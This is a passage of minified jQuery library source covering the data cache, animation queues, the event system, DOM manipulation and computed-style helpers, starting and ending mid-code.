b;for(b in a)if(("data"!==b||!m.isEmptyObject(a[b]))&&"toJSON"!==b)return!1;
return!0}function Q(a,b,d,e){if(m.acceptData(a)){var f,g,h=m.expando,i=a.nodeType,j=i?m.cache:a,k=i?a[h]:a[h]&&h;if(k&&j[k]&&(e||j[k].data)||void 0!==d||"string"!=typeof b)return k||(k=i?a[h]=c.pop()||m.guid++:h),j[k]||(j[k]=i?{}:{toJSON:m.noop}),("object"==typeof b||"function"==typeof b)&&(e?j[k]=m.extend(j[k],b):j[k].data=m.extend(j[k].data,b)),g=j[k],e||(g.data||(g.data={}),g=g.data),void 0!==d&&(g[m.camelCase(b)]=d),"string"==typeof b?(f=g[b],null==f&&(f=g[m.camelCase(b)])):f=g,f}}function R(a,b,c){if(m.acceptData(a)){var d,e,f=a.nodeType,g=f?m.cache:a,h=f?a[m.expando]:m.expando;if(g[h]){if(b&&(d=c?g[h]:g[h].data)){m.isArray(b)?b=b.concat(m.map(b,m.camelCase)):b in d?b=[b]:(b=m.camelCase(b),b=b in d?[b]:b.split(" ")),e=b.length;while(e--)delete d[b[e]];if(c?!P(d):!m.isEmptyObject(d))return}(c||(delete g[h].data,P(g[h])))&&(f?m.cleanData([a],!0):k.deleteExpando||g!=g.window?delete g[h]:g[h]=null)}}}m.extend({cache:{},noData:{"applet ":!0,"embed ":!0,"object ":"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"},hasData:function(a){return a=a.nodeType?m.cache[a[m.expando]]:a[m.expando],!!a&&!P(a)},data:function(a,b,c){return Q(a,b,c)},removeData:function(a,b){return R(a,b)},_data:function(a,b,c){return Q(a,b,c,!0)},_removeData:function(a,b){return R(a,b,!0)}}),m.fn.extend({data:function(a,b){var c,d,e,f=this[0],g=f&&f.attributes;if(void 0===a){if(this.length&&(e=m.data(f),1===f.nodeType&&!m._data(f,"parsedAttrs"))){c=g.length;while(c--)g[c]&&(d=g[c].name,0===d.indexOf("data-")&&(d=m.camelCase(d.slice(5)),O(f,d,e[d])));m._data(f,"parsedAttrs",!0)}return e}return"object"==typeof a?this.each(function(){m.data(this,a)}):arguments.length>1?this.each(function(){m.data(this,a,b)}):f?O(f,a,m.data(f,a)):void 0},removeData:function(a){return this.each(function(){m.removeData(this,a)})}}),m.extend({queue:function(a,b,c){var d;return a?(b=(b||"fx")+"queue",d=m._data(a,b),c&&(!d||m.isArray(c)?d=m._data(a,b,m.makeArray(c)):d.push(c)),d||[]):void 0},dequeue:function(a,b){b=b||"fx";var c=m.queue(a,b),d=c.length,e=c.shift(),f=m._queueHooks(a,b),g=function(){m.dequeue(a,b)};"inprogress"===e&&(e=c.shift(),d--),e&&("fx"===b&&c.unshift("inprogress"),delete f.stop,e.call(a,g,f)),!d&&f&&f.empty.fire()},_queueHooks:function(a,b){var c=b+"queueHooks";return m._data(a,c)||m._data(a,c,{empty:m.Callbacks("once memory").add(function(){m._removeData(a,b+"queue"),m._removeData(a,c)})})}}),m.fn.extend({queue:function(a,b){var c=2;return"string"!=typeof a&&(b=a,a="fx",c--),arguments.length<c?m.queue(this[0],a):void 0===b?this:this.each(function(){var c=m.queue(this,a,b);m._queueHooks(this,a),"fx"===a&&"inprogress"!==c[0]&&m.dequeue(this,a)})},dequeue:function(a){return this.each(function(){m.dequeue(this,a)})},clearQueue:function(a){return this.queue(a||"fx",[])},promise:function(a,b){var c,d=1,e=m.Deferred(),f=this,g=this.length,h=function(){--d||e.resolveWith(f,[f])};"string"!=typeof a&&(b=a,a=void 0),a=a||"fx";while(g--)c=m._data(f[g],a+"queueHooks"),c&&c.empty&&(d++,c.empty.add(h));return h(),e.promise(b)}});var S=/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,T=["Top","Right","Bottom","Left"],U=function(a,b){return a=b||a,"none"===m.css(a,"display")||!m.contains(a.ownerDocument,a)},V=m.access=function(a,b,c,d,e,f,g){var h=0,i=a.length,j=null==c;if("object"===m.type(c)){e=!0;for(h in c)m.access(a,b,h,c[h],!0,f,g)}else if(void 0!==d&&(e=!0,m.isFunction(d)||(g=!0),j&&(g?(b.call(a,d),b=null):(j=b,b=function(a,b,c){return j.call(m(a),c)})),b))for(;i>h;h++)b(a[h],c,g?d:d.call(a[h],h,b(a[h],c)));return e?a:j?b.call(a):i?b(a[0],c):f},W=/^(?:checkbox|radio)$/i;!function(){var a=y.createElement("input"),b=y.createElement("div"),c=y.createDocumentFragment();if(b.innerHTML="  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>",k.leadingWhitespace=3===b.firstChild.nodeType,k.tbody=!b.getElementsByTagName("tbody").length,k.htmlSerialize=!!b.getElementsByTagName("link").length,k.html5Clone="<:nav></:nav>"!==y.createElement("nav").cloneNode(!0).outerHTML,a.type="checkbox",a.checked=!0,c.appendChild(a),k.appendChecked=a.checked,b.innerHTML="<textarea>x</textarea>",k.noCloneChecked=!!b.cloneNode(!0).lastChild.defaultValue,c.appendChild(b),b.innerHTML="<input type='radio' checked='checked' name='t'/>",k.checkClone=b.cloneNode(!0).cloneNode(!0).lastChild.checked,k.noCloneEvent=!0,b.attachEvent&&(b.attachEvent("onclick",function(){k.noCloneEvent=!1}),b.cloneNode(!0).click()),null==k.deleteExpando){k.deleteExpando=!0;try{delete b.test}catch(d){k.deleteExpando=!1}}}(),function(){var b,c,d=y.createElement("div");for(b in{submit:!0,change:!0,focusin:!0})c="on"+b,(k[b+"Bubbles"]=c in a)||(d.setAttribute(c,"t"),k[b+"Bubbles"]=d.attributes[c].expando===!1);d=null}();var X=/^(?:input|select|textarea)$/i,Y=/^key/,Z=/^(?:mouse|pointer|contextmenu)|click/,$=/^(?:focusinfocus|focusoutblur)$/,_=/^([^.]*)(?:\.(.+)|)$/;function ab(){return!0}function bb(){return!1}function cb(){try{return y.activeElement}catch(a){}}m.event={global:{},add:function(a,b,c,d,e){var f,g,h,i,j,k,l,n,o,p,q,r=m._data(a);if(r){c.handler&&(i=c,c=i.handler,e=i.selector),c.guid||(c.guid=m.guid++),(g=r.events)||(g=r.events={}),(k=r.handle)||(k=r.handle=function(a){return typeof m===K||a&&m.event.triggered===a.type?void 0:m.event.dispatch.apply(k.elem,arguments)},k.elem=a),b=(b||"").match(E)||[""],h=b.length;while(h--)f=_.exec(b[h])||[],o=q=f[1],p=(f[2]||"").split(".").sort(),o&&(j=m.event.special[o]||{},o=(e?j.delegateType:j.bindType)||o,j=m.event.special[o]||{},l=m.extend({type:o,origType:q,data:d,handler:c,guid:c.guid,selector:e,needsContext:e&&m.expr.match.needsContext.test(e),namespace:p.join(".")},i),(n=g[o])||(n=g[o]=[],n.delegateCount=0,j.setup&&j.setup.call(a,d,p,k)!==!1||(a.addEventListener?a.addEventListener(o,k,!1):a.attachEvent&&a.attachEvent("on"+o,k))),j.add&&(j.add.call(a,l),l.handler.guid||(l.handler.guid=c.guid)),e?n.splice(n.delegateCount++,0,l):n.push(l),m.event.global[o]=!0);a=null}},remove:function(a,b,c,d,e){var f,g,h,i,j,k,l,n,o,p,q,r=m.hasData(a)&&m._data(a);if(r&&(k=r.events)){b=(b||"").match(E)||[""],j=b.length;while(j--)if(h=_.exec(b[j])||[],o=q=h[1],p=(h[2]||"").split(".").sort(),o){l=m.event.special[o]||{},o=(d?l.delegateType:l.bindType)||o,n=k[o]||[],h=h[2]&&new RegExp("(^|\\.)"+p.join("\\.(?:.*\\.|)")+"(\\.|$)"),i=f=n.length;while(f--)g=n[f],!e&&q!==g.origType||c&&c.guid!==g.guid||h&&!h.test(g.namespace)||d&&d!==g.selector&&("**"!==d||!g.selector)||(n.splice(f,1),g.selector&&n.delegateCount--,l.remove&&l.remove.call(a,g));i&&!n.length&&(l.teardown&&l.teardown.call(a,p,r.handle)!==!1||m.removeEvent(a,o,r.handle),delete k[o])}else for(o in k)m.event.remove(a,o+b[j],c,d,!0);m.isEmptyObject(k)&&(delete r.handle,m._removeData(a,"events"))}},trigger:function(b,c,d,e){var f,g,h,i,k,l,n,o=[d||y],p=j.call(b,"type")?b.type:b,q=j.call(b,"namespace")?b.namespace.split("."):[];if(h=l=d=d||y,3!==d.nodeType&&8!==d.nodeType&&!$.test(p+m.event.triggered)&&(p.indexOf(".")>=0&&(q=p.split("."),p=q.shift(),q.sort()),g=p.indexOf(":")<0&&"on"+p,b=b[m.expando]?b:new m.Event(p,"object"==typeof b&&b),b.isTrigger=e?2:3,b.namespace=q.join("."),b.namespace_re=b.namespace?new RegExp("(^|\\.)"+q.join("\\.(?:.*\\.|)")+"(\\.|$)"):null,b.result=void 0,b.target||(b.target=d),c=null==c?[b]:m.makeArray(c,[b]),k=m.event.special[p]||{},e||!k.trigger||k.trigger.apply(d,c)!==!1)){if(!e&&!k.noBubble&&!m.isWindow(d)){for(i=k.delegateType||p,$.test(i+p)||(h=h.parentNode);h;h=h.parentNode)o.push(h),l=h;l===(d.ownerDocument||y)&&o.push(l.defaultView||l.parentWindow||a)}n=0;while((h=o[n++])&&!b.isPropagationStopped())b.type=n>1?i:k.bindType||p,f=(m._data(h,"events")||{})[b.type]&&m._data(h,"handle"),f&&f.apply(h,c),f=g&&h[g],f&&f.apply&&m.acceptData(h)&&(b.result=f.apply(h,c),b.result===!1&&b.preventDefault());if(b.type=p,!e&&!b.isDefaultPrevented()&&(!k._default||k._default.apply(o.pop(),c)===!1)&&m.acceptData(d)&&g&&d[p]&&!m.isWindow(d)){l=d[g],l&&(d[g]=null),m.event.triggered=p;try{d[p]()}catch(r){}m.event.triggered=void 0,l&&(d[g]=l)}return b.result}},dispatch:function(a){a=m.event.fix(a);var b,c,e,f,g,h=[],i=d.call(arguments),j=(m._data(this,"events")||{})[a.type]||[],k=m.event.special[a.type]||{};if(i[0]=a,a.delegateTarget=this,!k.preDispatch||k.preDispatch.call(this,a)!==!1){h=m.event.handlers.call(this,a,j),b=0;while((f=h[b++])&&!a.isPropagationStopped()){a.currentTarget=f.elem,g=0;while((e=f.handlers[g++])&&!a.isImmediatePropagationStopped())(!a.namespace_re||a.namespace_re.test(e.namespace))&&(a.handleObj=e,a.data=e.data,c=((m.event.special[e.origType]||{}).handle||e.handler).apply(f.elem,i),void 0!==c&&(a.result=c)===!1&&(a.preventDefault(),a.stopPropagation()))}return k.postDispatch&&k.postDispatch.call(this,a),a.result}},handlers:function(a,b){var c,d,e,f,g=[],h=b.delegateCount,i=a.target;if(h&&i.nodeType&&(!a.button||"click"!==a.type))for(;i!=this;i=i.parentNode||this)if(1===i.nodeType&&(i.disabled!==!0||"click"!==a.type)){for(e=[],f=0;h>f;f++)d=b[f],c=d.selector+" ",void 0===e[c]&&(e[c]=d.needsContext?m(c,this).index(i)>=0:m.find(c,this,null,[i]).length),e[c]&&e.push(d);e.length&&g.push({elem:i,handlers:e})}return h<b.length&&g.push({elem:this,handlers:b.slice(h)}),g},fix:function(a){if(a[m.expando])return a;var b,c,d,e=a.type,f=a,g=this.fixHooks[e];g||(this.fixHooks[e]=g=Z.test(e)?this.mouseHooks:Y.test(e)?this.keyHooks:{}),d=g.props?this.props.concat(g.props):this.props,a=new m.Event(f),b=d.length;while(b--)c=d[b],a[c]=f[c];return a.target||(a.target=f.srcElement||y),3===a.target.nodeType&&(a.target=a.target.parentNode),a.metaKey=!!a.metaKey,g.filter?g.filter(a,f):a},props:"altKey bubbles cancelable ctrlKey currentTarget eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),fixHooks:{},keyHooks:{props:"char charCode key keyCode".split(" "),filter:function(a,b){return null==a.which&&(a.which=null!=b.charCode?b.charCode:b.keyCode),a}},mouseHooks:{props:"button buttons clientX clientY fromElement offsetX offsetY pageX pageY screenX screenY toElement".split(" "),filter:function(a,b){var c,d,e,f=b.button,g=b.fromElement;return null==a.pageX&&null!=b.clientX&&(d=a.target.ownerDocument||y,e=d.documentElement,c=d.body,a.pageX=b.clientX+(e&&e.scrollLeft||c&&c.scrollLeft||0)-(e&&e.clientLeft||c&&c.clientLeft||0),a.pageY=b.clientY+(e&&e.scrollTop||c&&c.scrollTop||0)-(e&&e.clientTop||c&&c.clientTop||0)),!a.relatedTarget&&g&&(a.relatedTarget=g===a.target?b.toElement:g),a.which||void 0===f||(a.which=1&f?1:2&f?3:4&f?2:0),a}},special:{load:{noBubble:!0},focus:{trigger:function(){if(this!==cb()&&this.focus)try{return this.focus(),!1}catch(a){}},delegateType:"focusin"},blur:{trigger:function(){return this===cb()&&this.blur?(this.blur(),!1):void 0},delegateType:"focusout"},click:{trigger:function(){return m.nodeName(this,"input")&&"checkbox"===this.type&&this.click?(this.click(),!1):void 0},_default:function(a){return m.nodeName(a.target,"a")}},beforeunload:{postDispatch:function(a){void 0!==a.result&&a.originalEvent&&(a.originalEvent.returnValue=a.result)}}},simulate:function(a,b,c,d){var e=m.extend(new m.Event,c,{type:a,isSimulated:!0,originalEvent:{}});d?m.event.trigger(e,null,b):m.event.dispatch.call(b,e),e.isDefaultPrevented()&&c.preventDefault()}},m.removeEvent=y.removeEventListener?function(a,b,c){a.removeEventListener&&a.removeEventListener(b,c,!1)}:function(a,b,c){var d="on"+b;a.detachEvent&&(typeof a[d]===K&&(a[d]=null),a.detachEvent(d,c))},m.Event=function(a,b){return this instanceof m.Event?(a&&a.type?(this.originalEvent=a,this.type=a.type,this.isDefaultPrevented=a.defaultPrevented||void 0===a.defaultPrevented&&a.returnValue===!1?ab:bb):this.type=a,b&&m.extend(this,b),this.timeStamp=a&&a.timeStamp||m.now(),void(this[m.expando]=!0)):new m.Event(a,b)},m.Event.prototype={isDefaultPrevented:bb,isPropagationStopped:bb,isImmediatePropagationStopped:bb,preventDefault:function(){var a=this.originalEvent;this.isDefaultPrevented=ab,a&&(a.preventDefault?a.preventDefault():a.returnValue=!1)},stopPropagation:function(){var a=this.originalEvent;this.isPropagationStopped=ab,a&&(a.stopPropagation&&a.stopPropagation(),a.cancelBubble=!0)},stopImmediatePropagation:function(){var a=this.originalEvent;this.isImmediatePropagationStopped=ab,a&&a.stopImmediatePropagation&&a.stopImmediatePropagation(),this.stopPropagation()}},m.each({mouseenter:"mouseover",mouseleave:"mouseout",pointerenter:"pointerover",pointerleave:"pointerout"},function(a,b){m.event.special[a]={delegateType:b,bindType:b,handle:function(a){var c,d=this,e=a.relatedTarget,f=a.handleObj;return(!e||e!==d&&!m.contains(d,e))&&(a.type=f.origType,c=f.handler.apply(this,arguments),a.type=b),c}}}),k.submitBubbles||(m.event.special.submit={setup:function(){return m.nodeName(this,"form")?!1:void m.event.add(this,"click._submit keypress._submit",function(a){var b=a.target,c=m.nodeName(b,"input")||m.nodeName(b,"button")?b.form:void 0;c&&!m._data(c,"submitBubbles")&&(m.event.add(c,"submit._submit",function(a){a._submit_bubble=!0}),m._data(c,"submitBubbles",!0))})},postDispatch:function(a){a._submit_bubble&&(delete a._submit_bubble,this.parentNode&&!a.isTrigger&&m.event.simulate("submit",this.parentNode,a,!0))},teardown:function(){return m.nodeName(this,"form")?!1:void m.event.remove(this,"._submit")}}),k.changeBubbles||(m.event.special.change={setup:function(){return X.test(this.nodeName)?(("checkbox"===this.type||"radio"===this.type)&&(m.event.add(this,"propertychange._change",function(a){"checked"===a.originalEvent.propertyName&&(this._just_changed=!0)}),m.event.add(this,"click._change",function(a){this._just_changed&&!a.isTrigger&&(this._just_changed=!1),m.event.simulate("change",this,a,!0)})),!1):void m.event.add(this,"beforeactivate._change",function(a){var b=a.target;X.test(b.nodeName)&&!m._data(b,"changeBubbles")&&(m.event.add(b,"change._change",function(a){!this.parentNode||a.isSimulated||a.isTrigger||m.event.simulate("change",this.parentNode,a,!0)}),m._data(b,"changeBubbles",!0))})},handle:function(a){var b=a.target;return this!==b||a.isSimulated||a.isTrigger||"radio"!==b.type&&"checkbox"!==b.type?a.handleObj.handler.apply(this,arguments):void 0},teardown:function(){return m.event.remove(this,"._change"),!X.test(this.nodeName)}}),k.focusinBubbles||m.each({focus:"focusin",blur:"focusout"},function(a,b){var c=function(a){m.event.simulate(b,a.target,m.event.fix(a),!0)};m.event.special[b]={setup:function(){var d=this.ownerDocument||this,e=m._data(d,b);e||d.addEventListener(a,c,!0),m._data(d,b,(e||0)+1)},teardown:function(){var d=this.ownerDocument||this,e=m._data(d,b)-1;e?m._data(d,b,e):(d.removeEventListener(a,c,!0),m._removeData(d,b))}}}),m.fn.extend({on:function(a,b,c,d,e){var f,g;if("object"==typeof a){"string"!=typeof b&&(c=c||b,b=void 0);for(f in a)this.on(f,b,c,a[f],e);return this}if(null==c&&null==d?(d=b,c=b=void 0):null==d&&("string"==typeof b?(d=c,c=void 0):(d=c,c=b,b=void 0)),d===!1)d=bb;else if(!d)return this;return 1===e&&(g=d,d=function(a){return m().off(a),g.apply(this,arguments)},d.guid=g.guid||(g.guid=m.guid++)),this.each(function(){m.event.add(this,a,d,c,b)})},one:function(a,b,c,d){return this.on(a,b,c,d,1)},off:function(a,b,c){var d,e;if(a&&a.preventDefault&&a.handleObj)return d=a.handleObj,m(a.delegateTarget).off(d.namespace?d.origType+"."+d.namespace:d.origType,d.selector,d.handler),this;if("object"==typeof a){for(e in a)this.off(e,b,a[e]);return this}return(b===!1||"function"==typeof b)&&(c=b,b=void 0),c===!1&&(c=bb),this.each(function(){m.event.remove(this,a,c,b)})},trigger:function(a,b){return this.each(function(){m.event.trigger(a,b,this)})},triggerHandler:function(a,b){var c=this[0];return c?m.event.trigger(a,b,c,!0):void 0}});function db(a){var b=eb.split("|"),c=a.createDocumentFragment();if(c.createElement)while(b.length)c.createElement(b.pop());return c}var eb="abbr|article|aside|audio|bdi|canvas|data|datalist|details|figcaption|figure|footer|header|hgroup|mark|meter|nav|output|progress|section|summary|time|video",fb=/ jQuery\d+="(?:null|\d+)"/g,gb=new RegExp("<(?:"+eb+")[\\s/>]","i"),hb=/^\s+/,ib=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,jb=/<([\w:]+)/,kb=/<tbody/i,lb=/<|&#?\w+;/,mb=/<(?:script|style|link)/i,nb=/checked\s*(?:[^=]|=\s*.checked.)/i,ob=/^$|\/(?:java|ecma)script/i,pb=/^true\/(.*)/,qb=/^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g,rb={option:[1,"<select multiple='multiple'>","</select>"],legend:[1,"<fieldset>","</fieldset>"],area:[1,"<map>","</map>"],param:[1,"<object>","</object>"],thead:[1,"<table>","</table>"],tr:[2,"<table><tbody>","</tbody></table>"],col:[2,"<table><tbody></tbody><colgroup>","</colgroup></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],_default:k.htmlSerialize?[0,"",""]:[1,"X<div>","</div>"]},sb=db(y),tb=sb.appendChild(y.createElement("div"));rb.optgroup=rb.option,rb.tbody=rb.tfoot=rb.colgroup=rb.caption=rb.thead,rb.th=rb.td;function ub(a,b){var c,d,e=0,f=typeof a.getElementsByTagName!==K?a.getElementsByTagName(b||"*"):typeof a.querySelectorAll!==K?a.querySelectorAll(b||"*"):void 0;if(!f)for(f=[],c=a.childNodes||a;null!=(d=c[e]);e++)!b||m.nodeName(d,b)?f.push(d):m.merge(f,ub(d,b));return void 0===b||b&&m.nodeName(a,b)?m.merge([a],f):f}function vb(a){W.test(a.type)&&(a.defaultChecked=a.checked)}function wb(a,b){return m.nodeName(a,"table")&&m.nodeName(11!==b.nodeType?b:b.firstChild,"tr")?a.getElementsByTagName("tbody")[0]||a.appendChild(a.ownerDocument.createElement("tbody")):a}function xb(a){return a.type=(null!==m.find.attr(a,"type"))+"/"+a.type,a}function yb(a){var b=pb.exec(a.type);return b?a.type=b[1]:a.removeAttribute("type"),a}function zb(a,b){for(var c,d=0;null!=(c=a[d]);d++)m._data(c,"globalEval",!b||m._data(b[d],"globalEval"))}function Ab(a,b){if(1===b.nodeType&&m.hasData(a)){var c,d,e,f=m._data(a),g=m._data(b,f),h=f.events;if(h){delete g.handle,g.events={};for(c in h)for(d=0,e=h[c].length;e>d;d++)m.event.add(b,c,h[c][d])}g.data&&(g.data=m.extend({},g.data))}}function Bb(a,b){var c,d,e;if(1===b.nodeType){if(c=b.nodeName.toLowerCase(),!k.noCloneEvent&&b[m.expando]){e=m._data(b);for(d in e.events)m.removeEvent(b,d,e.handle);b.removeAttribute(m.expando)}"script"===c&&b.text!==a.text?(xb(b).text=a.text,yb(b)):"object"===c?(b.parentNode&&(b.outerHTML=a.outerHTML),k.html5Clone&&a.innerHTML&&!m.trim(b.innerHTML)&&(b.innerHTML=a.innerHTML)):"input"===c&&W.test(a.type)?(b.defaultChecked=b.checked=a.checked,b.value!==a.value&&(b.value=a.value)):"option"===c?b.defaultSelected=b.selected=a.defaultSelected:("input"===c||"textarea"===c)&&(b.defaultValue=a.defaultValue)}}m.extend({clone:function(a,b,c){var d,e,f,g,h,i=m.contains(a.ownerDocument,a);if(k.html5Clone||m.isXMLDoc(a)||!gb.test("<"+a.nodeName+">")?f=a.cloneNode(!0):(tb.innerHTML=a.outerHTML,tb.removeChild(f=tb.firstChild)),!(k.noCloneEvent&&k.noCloneChecked||1!==a.nodeType&&11!==a.nodeType||m.isXMLDoc(a)))for(d=ub(f),h=ub(a),g=0;null!=(e=h[g]);++g)d[g]&&Bb(e,d[g]);if(b)if(c)for(h=h||ub(a),d=d||ub(f),g=0;null!=(e=h[g]);g++)Ab(e,d[g]);else Ab(a,f);return d=ub(f,"script"),d.length>0&&zb(d,!i&&ub(a,"script")),d=h=e=null,f},buildFragment:function(a,b,c,d){for(var e,f,g,h,i,j,l,n=a.length,o=db(b),p=[],q=0;n>q;q++)if(f=a[q],f||0===f)if("object"===m.type(f))m.merge(p,f.nodeType?[f]:f);else if(lb.test(f)){h=h||o.appendChild(b.createElement("div")),i=(jb.exec(f)||["",""])[1].toLowerCase(),l=rb[i]||rb._default,h.innerHTML=l[1]+f.replace(ib,"<$1></$2>")+l[2],e=l[0];while(e--)h=h.lastChild;if(!k.leadingWhitespace&&hb.test(f)&&p.push(b.createTextNode(hb.exec(f)[0])),!k.tbody){f="table"!==i||kb.test(f)?"<table>"!==l[1]||kb.test(f)?0:h:h.firstChild,e=f&&f.childNodes.length;while(e--)m.nodeName(j=f.childNodes[e],"tbody")&&!j.childNodes.length&&f.removeChild(j)}m.merge(p,h.childNodes),h.textContent="";while(h.firstChild)h.removeChild(h.firstChild);h=o.lastChild}else p.push(b.createTextNode(f));h&&o.removeChild(h),k.appendChecked||m.grep(ub(p,"input"),vb),q=0;while(f=p[q++])if((!d||-1===m.inArray(f,d))&&(g=m.contains(f.ownerDocument,f),h=ub(o.appendChild(f),"script"),g&&zb(h),c)){e=0;while(f=h[e++])ob.test(f.type||"")&&c.push(f)}return h=null,o},cleanData:function(a,b){for(var d,e,f,g,h=0,i=m.expando,j=m.cache,l=k.deleteExpando,n=m.event.special;null!=(d=a[h]);h++)if((b||m.acceptData(d))&&(f=d[i],g=f&&j[f])){if(g.events)for(e in g.events)n[e]?m.event.remove(d,e):m.removeEvent(d,e,g.handle);j[f]&&(delete j[f],l?delete d[i]:typeof d.removeAttribute!==K?d.removeAttribute(i):d[i]=null,c.push(f))}}}),m.fn.extend({text:function(a){return V(this,function(a){return void 0===a?m.text(this):this.empty().append((this[0]&&this[0].ownerDocument||y).createTextNode(a))},null,a,arguments.length)},append:function(){return this.domManip(arguments,function(a){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var b=wb(this,a);b.appendChild(a)}})},prepend:function(){return this.domManip(arguments,function(a){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var b=wb(this,a);b.insertBefore(a,b.firstChild)}})},before:function(){return this.domManip(arguments,function(a){this.parentNode&&this.parentNode.insertBefore(a,this)})},after:function(){return this.domManip(arguments,function(a){this.parentNode&&this.parentNode.insertBefore(a,this.nextSibling)})},remove:function(a,b){for(var c,d=a?m.filter(a,this):this,e=0;null!=(c=d[e]);e++)b||1!==c.nodeType||m.cleanData(ub(c)),c.parentNode&&(b&&m.contains(c.ownerDocument,c)&&zb(ub(c,"script")),c.parentNode.removeChild(c));return this},empty:function(){for(var a,b=0;null!=(a=this[b]);b++){1===a.nodeType&&m.cleanData(ub(a,!1));while(a.firstChild)a.removeChild(a.firstChild);a.options&&m.nodeName(a,"select")&&(a.options.length=0)}return this},clone:function(a,b){return a=null==a?!1:a,b=null==b?a:b,this.map(function(){return m.clone(this,a,b)})},html:function(a){return V(this,function(a){var b=this[0]||{},c=0,d=this.length;if(void 0===a)return 1===b.nodeType?b.innerHTML.replace(fb,""):void 0;if(!("string"!=typeof a||mb.test(a)||!k.htmlSerialize&&gb.test(a)||!k.leadingWhitespace&&hb.test(a)||rb[(jb.exec(a)||["",""])[1].toLowerCase()])){a=a.replace(ib,"<$1></$2>");try{for(;d>c;c++)b=this[c]||{},1===b.nodeType&&(m.cleanData(ub(b,!1)),b.innerHTML=a);b=0}catch(e){}}b&&this.empty().append(a)},null,a,arguments.length)},replaceWith:function(){var a=arguments[0];return this.domManip(arguments,function(b){a=this.parentNode,m.cleanData(ub(this)),a&&a.replaceChild(b,this)}),a&&(a.length||a.nodeType)?this:this.remove()},detach:function(a){return this.remove(a,!0)},domManip:function(a,b){a=e.apply([],a);var c,d,f,g,h,i,j=0,l=this.length,n=this,o=l-1,p=a[0],q=m.isFunction(p);if(q||l>1&&"string"==typeof p&&!k.checkClone&&nb.test(p))return this.each(function(c){var d=n.eq(c);q&&(a[0]=p.call(this,c,d.html())),d.domManip(a,b)});if(l&&(i=m.buildFragment(a,this[0].ownerDocument,!1,this),c=i.firstChild,1===i.childNodes.length&&(i=c),c)){for(g=m.map(ub(i,"script"),xb),f=g.length;l>j;j++)d=i,j!==o&&(d=m.clone(d,!0,!0),f&&m.merge(g,ub(d,"script"))),b.call(this[j],d,j);if(f)for(h=g[g.length-1].ownerDocument,m.map(g,yb),j=0;f>j;j++)d=g[j],ob.test(d.type||"")&&!m._data(d,"globalEval")&&m.contains(h,d)&&(d.src?m._evalUrl&&m._evalUrl(d.src):m.globalEval((d.text||d.textContent||d.innerHTML||"").replace(qb,"")));i=c=null}return this}}),m.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(a,b){m.fn[a]=function(a){for(var c,d=0,e=[],g=m(a),h=g.length-1;h>=d;d++)c=d===h?this:this.clone(!0),m(g[d])[b](c),f.apply(e,c.get());return this.pushStack(e)}});var Cb,Db={};function Eb(b,c){var d,e=m(c.createElement(b)).appendTo(c.body),f=a.getDefaultComputedStyle&&(d=a.getDefaultComputedStyle(e[0]))?d.display:m.css(e[0],"display");return e.detach(),f}function Fb(a){var b=y,c=Db[a];return c||(c=Eb(a,b),"none"!==c&&c||(Cb=(Cb||m("<iframe frameborder='0' width='0' height='0'/>")).appendTo(b.documentElement),b=(Cb[0].contentWindow||Cb[0].contentDocument).document,b.write(),b.close(),c=Eb(a,b),Cb.detach()),Db[a]=c),c}!function(){var a;k.shrinkWrapBlocks=function(){if(null!=a)return a;a=!1;var b,c,d;return c=y.getElementsByTagName("body")[0],c&&c.style?(b=y.createElement("div"),d=y.createElement("div"),d.style.cssText="position:absolute;border:0;width:0;height:0;top:0;left:-9999px",c.appendChild(d).appendChild(b),typeof b.style.zoom!==K&&(b.style.cssText="-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:1px;width:1px;zoom:1",b.appendChild(y.createElement("div")).style.width="5px",a=3!==b.offsetWidth),c.removeChild(d),a):void 0}}();var Gb=/^margin/,Hb=new RegExp("^("+S+")(?!px)[a-z%]+$","i"),Ib,Jb,Kb=/^(top|right|bottom|left)$/;a.getComputedStyle?(Ib=function(b){return b.ownerDocument.defaultView.opener?b.ownerDocument.defaultView.getComputedStyle(b,null):a.getComputedStyle(b,null)},Jb=function(a,b,c){var d,e,f,g,h=a.style;return c=c||Ib(a),g=c?c.getPropertyValue(b)||c[b]:void 0,c&&(""!==g||m.contains(a.ownerDocument,a)||(g=m.style(a,b)),Hb.test(g)&&Gb.test(b)&&(d=h.width,e=h.minWidth,f=h.maxWidth,h.minWidth=h.maxWidth=h.width=g,g=c.width,h.width=d,h.minWidth=e,h.maxWidth=f)),void 0===g?g:g+""}):y.documentElement.currentStyle&&(Ib=function(a){return a.currentStyle},Jb=function(a,b,c){var d,e,f,g,h=a.style;return c=c||Ib(a),g=c?c[b]:void 0,null==g&&h&&h[b]&&(g=h[b]),Hb.test(g)&&!Kb.test(b)&&(d=h.left,e=a.runtimeStyle,f=e&&e.left,f&&(e.left=a.currentStyle.left),h.left="fontSize"===b?"1em":g,g=h.pixelLeft+"px",h.left=d,f&&(e.left=f)),void 0===g?g:g+""||"auto"});function Lb(a,b){return{get:function(){var c=a();if(null!=c)return c?void delete this.get:(this.get=b).apply(this,arguments)}}}!function(){var b,c,d,e,f,g,h;if(b=y.createElement("div"),b.innerHTML="  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>",d=b.getElementsByTagName("a")[0],c=d&&d.style){c.cssText="float:left;opacity:.5",k.opacity="0.5"===c.opacity,k.cssFloat=!!c.cssFloat,b.style.backgroundClip="content-box",b.cloneNode(!0).style.backgroundClip="",k.clearCloneStyle="content-box"===b.style.backgroundClip,k.boxSizing=""===c.boxSizing||""===c.MozBoxSizing||""===c.WebkitBoxSizing,m.extend(k,{reliableHiddenOffsets:function(){return null==g&&i(),g},boxSizingReliable:function(){return null==f&&i(),f},pixelPosition:function(){return null==e&&i(),e},reliableMarginRight:function(){return null==h&&i(),h}});function i(){var 